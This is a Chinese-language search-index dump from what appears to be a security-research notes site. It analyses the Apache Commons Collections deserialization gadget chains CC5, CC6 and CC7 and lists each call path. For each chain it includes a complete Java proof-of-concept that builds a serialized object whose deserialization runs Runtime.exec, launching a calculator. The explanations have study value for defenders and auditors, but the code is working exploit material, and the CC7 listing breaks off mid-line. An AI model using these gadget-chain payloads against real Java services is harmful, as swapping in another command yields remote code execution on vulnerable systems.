\u65e0readObject\u65b9\u6cd5\uff09","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/#_3","text":"\u8c03\u8bd5\u8be5\u94fe\u65f6\uff0c\u56e0\u4e3a\u6d89\u53catoString\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5idea\u8c03\u8bd5\u8bf7\u5173\u95ed\u6b64\u4fe9\u9009\u9879 ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; public class cc5 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"open /System/Applications/Calculator.app\"})}); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); TiedMapEntry tiedmap = new TiedMapEntry(map,123); BadAttributeValueExpException poc = new BadAttributeValueExpException(1); Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\"); val.setAccessible(true); val.set(poc,tiedmap); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc5\")); outputStream.writeObject(poc); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc5\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u524d\u534a\u90e8\u5206\u548cCC1\u4e00\u6837\uff0c\u540e\u534a\u90e8\u5206\u5f15\u5165\u4e86TiedMapEntry \u548cBadAttributeValueExpException \uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4fe9\u4e1c\u897f\u3002","title":"\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/#tiedmapentry","text":"\u9996\u5148\u6211\u4eec\u5728CC1\u4e2d\u5df2\u7ecf\u77e5\u9053\u4e86LazyMap\u7684get\u65b9\u6cd5\u4f1a\u89e6\u53d1\u5176\u5728decorate\u4e2d\u4f20\u5165\u7684Transfromer\u7c7b\u7684transform\u65b9\u6cd5\u3002 \u5728TiedMapEntry\u7c7b\u4e2d\u5b58\u5728\u65b9\u6cd5getValue\uff0c\u4f1a\u8c03\u7528\u5728\u6784\u9020\u51fd\u6570\u4e2d\u4f20\u5165\u7684map\u7684get\u65b9\u6cd5 \u800c\u4e14\u5728TiedMapEntry\u7c7b\u4e2d\u540c\u65f6\u4e5f\u5b58\u5728\u65b9\u6cd5toString\u4f1a\u8c03\u7528getValue\u65b9\u6cd5","title":"TiedMapEntry&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/#badattributevalueexpexception","text":"\u8be5\u7c7b\u7684readObject\u65b9\u6cd5\u5982\u4e0b \u8fd9\u91cc\u4f1a\u8c03\u7528toString\u65b9\u6cd5\uff0c\u7136\u540e\u8fdb\u5165TideMapEntry\u5f00\u59cb\u94fe\u7684\u6267\u884c\u3002 \u8fd9\u91ccvalObj\u5c31\u662fval\u53d8\u91cf\u7684\u503c\u3002 Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\"); val.setAccessible(true); val.set(poc,tiedmap); \u6240\u4ee5\u6211\u4eec\u5728POC\u4e2d\u7528\u53cd\u5c04\u5c06val\u53d8\u91cf\u8fdb\u884c\u4e86\u8d4b\u503c\uff0c\u8d4b\u7684\u503c\u662f\u6076\u610fTiedMapEntry \u5bf9\u8c61\u3002 \u8fd9\u91cc\u6709\u4e00\u4e2a\u7ec6\u8282\u5c31\u662f\uff0cval\u53d8\u91cf\u662f\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u51fd\u6570\u8d4b\u503c\u7684\u3002 \u4f46\u662f\u5982\u679c\u7528\u6784\u9020\u51fd\u6570\u76f4\u63a5\u7ed9val\u8d4b\u503c\u7684\u8bdd\uff0c\u4f1a\u5bfc\u81f4val\u5728\u8d4b\u503c\u7684\u65f6\u5019\u4fbf\u89e6\u53d1toString,\u5bfc\u81f4\u5728\u53cd\u5e8f\u5217\u5316\u65f6\uff0cvalObject\u7684\u503c\u6539\u53d8\uff0c\u5bfc\u81f4\u539f\u672c\u9884\u671f\u7684\u903b\u8f91\u6539\u53d8\uff0c\u65e0\u6cd5\u8fdb\u5165\u9884\u60f3\u7684\u5206\u652f\u3002 \u8fd9\u662f\u9884\u671f\u7684\u60c5\u51b5\uff08\u901a\u8fc7\u540e\u671f\u53cd\u5c04\u8d4b\u503cval\uff09 \u8fd9\u662f\u975e\u9884\u671f\u60c5\u51b5\uff08\u901a\u8fc7\u6784\u9020\u51fd\u6570\u76f4\u63a5\u7ed9val\u8d4b\u503c\uff0c\u8fd9\u91cc\u7684val\u503c\u76f4\u63a5\u53d8\u6210\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e0d\u8981\u4ee5\u4e3a\u662fProcessImpl\u5bf9\u8c61\uff01\u6ce8\u610f\u5f15\u53f7\uff01\uff09","title":"BadAttributeValueExpException&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/","text":"Apache-Commons-Collections 6 \u76ee\u5f55 \u7248\u672c HashSet\u5229\u7528\u94fe POC\u5206\u6790 HashMap\u5229\u7528\u94fe POC\u5206\u6790 TideMap.hashcode+Lazymap \u7248\u672c CommonsCollections 3.1 - 3.2.1 HashSet\u5229\u7528\u94fe java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() ... org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; import java.util.Set; public class Main { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc\"})}); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); TiedMapEntry tiedmap = new TiedMapEntry(map,123); HashSet hashset = new HashSet(1); hashset.add(\"foo\"); Field field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\"); field.setAccessible(true); HashMap hashset_map = (HashMap) field.get(hashset); Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\"); table.setAccessible(true); Object[] array = (Object[])table.get(hashset_map); Object node = array[0]; Field key = node.getClass().getDeclaredField(\"key\"); key.setAccessible(true); key.set(node,tiedmap); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc6\")); outputStream.writeObject(hashset); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc6\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u5728TiedMapEntry \u4e2d\uff0c\u9664\u4e86toString\uff0c\u8fd8\u6709hashCode\u65b9\u6cd5\u53ef\u4ee5\u8c03\u7528getValue\u65b9\u6cd5 \u90a3\u4e48\u8fd9\u4e2ahashCode\u65b9\u6cd5\u54ea\u91cc\u53ef\u4ee5\u88ab\u8c03\u7528\u5462\uff1fcc6\u4e2d\u4f7f\u7528\u7684\u662fHashMap#hash \u90a3\u4e48\u54ea\u91cc\u8c03\u7528\u4e86HashMap.hash\u4e14\u4f20\u5165\u4e86\u53ef\u63a7\u53c2\u6570\uff1f\u8fd9\u91cc\u7528\u5230\u4e86HashMap#put\uff1a \u90a3\u4e48\u54ea\u91cc\u8c03\u7528\u4e86HashMap.put \u4e14\u4f20\u5165\u4e86\u53ef\u63a7\u53c2\u6570\uff1f\u8fd9\u91cc\u7528\u5230\u4e86HashSet#readObject\uff1a \u8fd9\u91cc\u7684e\u5c31\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u3002\u90a3\u4e48\u7531\u6b64\u89c2\u4e4b\uff0c\u94fe\u5b8c\u6574\u4e86\u3002\u8fd9\u91cc\u7684e\u503c\u662fHashMap\u91cctable\u4e2d\u6bcf\u4e00\u4e2aNode\u7684Key\u503c\uff0c\u4ed6\u8fd9\u91cc\u5faa\u73af\u8bfb\u53d6table\u4e2d\u7684\u6240\u6709Node\u7684Key\u503c\u5e76\u5904\u7406\u3002 POC\u5206\u6790 HashSet hashset = new HashSet(1); hashset.add(\"foo\"); Field field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\"); field.setAccessible(true); HashMap hashset_map = (HashMap) field.get(hashset); Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\"); table.setAccessible(true); Object[] array = (Object[])table.get(hashset_map); Object node = array[0]; Field key = node.getClass().getDeclaredField(\"key\"); key.setAccessible(true); key.set(node,tiedmap); \u8fd9\u91cc\u662f\u7528\u53cd\u5c04\uff0c\u53bb\u4fee\u6539HashSet\u91cc\u7684map\u5c5e\u6027\u4e2d\u7684table\u6570\u7ec4\u7b2c\u4e00\u9879\u7684key\u503c\u4e3a\u6076\u610fTiedMapEntry\u5bf9\u8c61 \u8fd9\u91cc\u6d89\u53ca\u5230HashMap\u7684\u7ed3\u6784\u3002 \u7b80\u800c\u8a00\u4e4b\uff0cHashMap\u5e95\u5c42\u662f\u7531\u4e00\u4e2a\u53ebtable\u7684\u957f\u6570\u7ec4\u7ec4\u6210\u7684\uff0ctable\u4e2d\u6bcf\u4e00\u9879\u90fd\u79f0\u4e3aNode\uff0c\u6bcf\u4e2aNode\u5b58\u50a8\u7684\u4fbf\u662f\u952e\u503c\u4fe1\u606f HashMap\u5229\u7528\u94fe \u5229\u7528\u94fe ObjectInputStream.readObject() HashMap.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.*; import java.io.*; import java.util.*; public class Main { public static void main(String[] args) throws Exception{ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc\"})}); HashMap innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,chain); TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123); HashMap hashMap = new HashMap(); hashMap.put(tmap, \"test\"); lazyMap.clear(); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc6\")); outputStream.writeObject(hashMap); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc6\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u5728HashMap#readObject\u4e2d\u5b58\u5728\u8fd9\u6837\u7684\u4ee3\u7801\u5757 \u8ddf\u8fdbputForCreate\u65b9\u6cd5\u53d1\u73b0\u5b83\u53ef\u4ee5\u8c03\u7528hash\u65b9\u6cd5 \u90a3\u4e48\u601d\u8def\u5f88\u660e\u663e\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7HashMap\u7684readObject\u65b9\u6cd5\u53bb\u8c03\u7528HashMap#putForCreate \u8fdb\u800c\u8c03\u7528HashMap#hash \u4ece\u800c\u5b9e\u73b0\u8fd9\u6761\u94fe\u3002 POC\u5206\u6790 HashMap hashMap = new HashMap(); hashMap.put(tmap, \"test\"); lazyMap.clear(); \u6211\u4eec\u6b64\u5904\u6709\u4e2aclear()\u64cd\u4f5c \u6211\u4eec\u5728\u5e8f\u5217\u5316\u524d\u5bf9HashMap\u8fdb\u884cput\u64cd\u4f5c\u65f6\uff0c\u4f1a\u8c03\u7528equals\u65b9\u6cd5 \u4e00\u76f4\u8ddf\u4e0b\u53bb\u4f1a\u53d1\u73b0\u4f1a\u89e6\u53d1lazymap\u7684get\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd9\u91cc\u4f1a\u53d1\u73b0\u8c03\u7528\u4e86put\u65b9\u6cd5\u5411lazymap\u589e\u52a0\u4e86\u952e\u503c\u5bf9\u3002 \u53ef\u4ee5\u53d1\u73b0\u6dfb\u52a0\u4e86\u4e00\u4e2aProcessImpl\u5bf9\u8c61\u7684value\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u6ca1\u6709\u5b9e\u73b0\u5e8f\u5217\u5316\u63a5\u53e3\uff0c\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u5982\u679c\u6ca1\u6709lazymap2.remove(\"yy\")\uff0c\u5c31\u4f1a\u5bfc\u81f4\u5728\u5e8f\u5217\u5316\u65f6\u51fa\u73b0\u9519\u8bef\u3002 \u6240\u4ee5\u901a\u8fc7lazymap2.remove(\"yy\")\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5254\u9664\u5728hashtable#put\u65f6\u6dfb\u52a0\u8fdblazymap2\u4e2d\u7684\u4e0d\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u5b9e\u73b0\u5e8f\u5217\u5316\u3002","title":"Apache-Commons-Collections 6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#apache-commons-collections-6","text":"","title":"Apache-Commons-Collections 6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#_1","text":"\u7248\u672c HashSet\u5229\u7528\u94fe POC\u5206\u6790 HashMap\u5229\u7528\u94fe POC\u5206\u6790 TideMap.hashcode+Lazymap","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#_2","text":"CommonsCollections 3.1 - 3.2.1","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#hashset","text":"java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() ... org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; import java.util.Set; public class Main { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc\"})}); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); TiedMapEntry tiedmap = new TiedMapEntry(map,123); HashSet hashset = new HashSet(1); hashset.add(\"foo\"); Field field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\"); field.setAccessible(true); HashMap hashset_map = (HashMap) field.get(hashset); Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\"); table.setAccessible(true); Object[] array = (Object[])table.get(hashset_map); Object node = array[0]; Field key = node.getClass().getDeclaredField(\"key\"); key.setAccessible(true); key.set(node,tiedmap); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc6\")); outputStream.writeObject(hashset); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc6\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u5728TiedMapEntry \u4e2d\uff0c\u9664\u4e86toString\uff0c\u8fd8\u6709hashCode\u65b9\u6cd5\u53ef\u4ee5\u8c03\u7528getValue\u65b9\u6cd5 \u90a3\u4e48\u8fd9\u4e2ahashCode\u65b9\u6cd5\u54ea\u91cc\u53ef\u4ee5\u88ab\u8c03\u7528\u5462\uff1fcc6\u4e2d\u4f7f\u7528\u7684\u662fHashMap#hash \u90a3\u4e48\u54ea\u91cc\u8c03\u7528\u4e86HashMap.hash\u4e14\u4f20\u5165\u4e86\u53ef\u63a7\u53c2\u6570\uff1f\u8fd9\u91cc\u7528\u5230\u4e86HashMap#put\uff1a \u90a3\u4e48\u54ea\u91cc\u8c03\u7528\u4e86HashMap.put \u4e14\u4f20\u5165\u4e86\u53ef\u63a7\u53c2\u6570\uff1f\u8fd9\u91cc\u7528\u5230\u4e86HashSet#readObject\uff1a \u8fd9\u91cc\u7684e\u5c31\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u3002\u90a3\u4e48\u7531\u6b64\u89c2\u4e4b\uff0c\u94fe\u5b8c\u6574\u4e86\u3002\u8fd9\u91cc\u7684e\u503c\u662fHashMap\u91cctable\u4e2d\u6bcf\u4e00\u4e2aNode\u7684Key\u503c\uff0c\u4ed6\u8fd9\u91cc\u5faa\u73af\u8bfb\u53d6table\u4e2d\u7684\u6240\u6709Node\u7684Key\u503c\u5e76\u5904\u7406\u3002","title":"HashSet\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#poc","text":"HashSet hashset = new HashSet(1); hashset.add(\"foo\"); Field field = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\"); field.setAccessible(true); HashMap hashset_map = (HashMap) field.get(hashset); Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\"); table.setAccessible(true); Object[] array = (Object[])table.get(hashset_map); Object node = array[0]; Field key = node.getClass().getDeclaredField(\"key\"); key.setAccessible(true); key.set(node,tiedmap); \u8fd9\u91cc\u662f\u7528\u53cd\u5c04\uff0c\u53bb\u4fee\u6539HashSet\u91cc\u7684map\u5c5e\u6027\u4e2d\u7684table\u6570\u7ec4\u7b2c\u4e00\u9879\u7684key\u503c\u4e3a\u6076\u610fTiedMapEntry\u5bf9\u8c61 \u8fd9\u91cc\u6d89\u53ca\u5230HashMap\u7684\u7ed3\u6784\u3002 \u7b80\u800c\u8a00\u4e4b\uff0cHashMap\u5e95\u5c42\u662f\u7531\u4e00\u4e2a\u53ebtable\u7684\u957f\u6570\u7ec4\u7ec4\u6210\u7684\uff0ctable\u4e2d\u6bcf\u4e00\u9879\u90fd\u79f0\u4e3aNode\uff0c\u6bcf\u4e2aNode\u5b58\u50a8\u7684\u4fbf\u662f\u952e\u503c\u4fe1\u606f","title":"POC\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#hashmap","text":"\u5229\u7528\u94fe ObjectInputStream.readObject() HashMap.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.*; import java.io.*; import java.util.*; public class Main { public static void main(String[] args) throws Exception{ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc\"})}); HashMap innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,chain); TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123); HashMap hashMap = new HashMap(); hashMap.put(tmap, \"test\"); lazyMap.clear(); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc6\")); outputStream.writeObject(hashMap); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc6\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u5728HashMap#readObject\u4e2d\u5b58\u5728\u8fd9\u6837\u7684\u4ee3\u7801\u5757 \u8ddf\u8fdbputForCreate\u65b9\u6cd5\u53d1\u73b0\u5b83\u53ef\u4ee5\u8c03\u7528hash\u65b9\u6cd5 \u90a3\u4e48\u601d\u8def\u5f88\u660e\u663e\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7HashMap\u7684readObject\u65b9\u6cd5\u53bb\u8c03\u7528HashMap#putForCreate \u8fdb\u800c\u8c03\u7528HashMap#hash \u4ece\u800c\u5b9e\u73b0\u8fd9\u6761\u94fe\u3002","title":"HashMap\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%206/Apache-Commons-Collections%206/#poc_1","text":"HashMap hashMap = new HashMap(); hashMap.put(tmap, \"test\"); lazyMap.clear(); \u6211\u4eec\u6b64\u5904\u6709\u4e2aclear()\u64cd\u4f5c \u6211\u4eec\u5728\u5e8f\u5217\u5316\u524d\u5bf9HashMap\u8fdb\u884cput\u64cd\u4f5c\u65f6\uff0c\u4f1a\u8c03\u7528equals\u65b9\u6cd5 \u4e00\u76f4\u8ddf\u4e0b\u53bb\u4f1a\u53d1\u73b0\u4f1a\u89e6\u53d1lazymap\u7684get\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd9\u91cc\u4f1a\u53d1\u73b0\u8c03\u7528\u4e86put\u65b9\u6cd5\u5411lazymap\u589e\u52a0\u4e86\u952e\u503c\u5bf9\u3002 \u53ef\u4ee5\u53d1\u73b0\u6dfb\u52a0\u4e86\u4e00\u4e2aProcessImpl\u5bf9\u8c61\u7684value\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u6ca1\u6709\u5b9e\u73b0\u5e8f\u5217\u5316\u63a5\u53e3\uff0c\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u5982\u679c\u6ca1\u6709lazymap2.remove(\"yy\")\uff0c\u5c31\u4f1a\u5bfc\u81f4\u5728\u5e8f\u5217\u5316\u65f6\u51fa\u73b0\u9519\u8bef\u3002 \u6240\u4ee5\u901a\u8fc7lazymap2.remove(\"yy\")\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5254\u9664\u5728hashtable#put\u65f6\u6dfb\u52a0\u8fdblazymap2\u4e2d\u7684\u4e0d\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u5b9e\u73b0\u5e8f\u5217\u5316\u3002","title":"POC\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/","text":"Apache-Commons-Collections 7 \u76ee\u5f55 \u7248\u672c \u5229\u7528\u94fe POC\u5206\u67901 POC\u5206\u67902 \u7248\u672c CommonsCollections 3.1 - 3.2.1 \u5229\u7528\u94fe HashTable.readObject() HashTable.reconstitutionPut() AbstractMapDecorator.equals() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.*; public class Main { public static void main(String[] args) throws Exception { ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc\"})}); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); lazyMap2.remove(\"yy\"); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc7\")); outputStream.writeObject(hashtable); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new 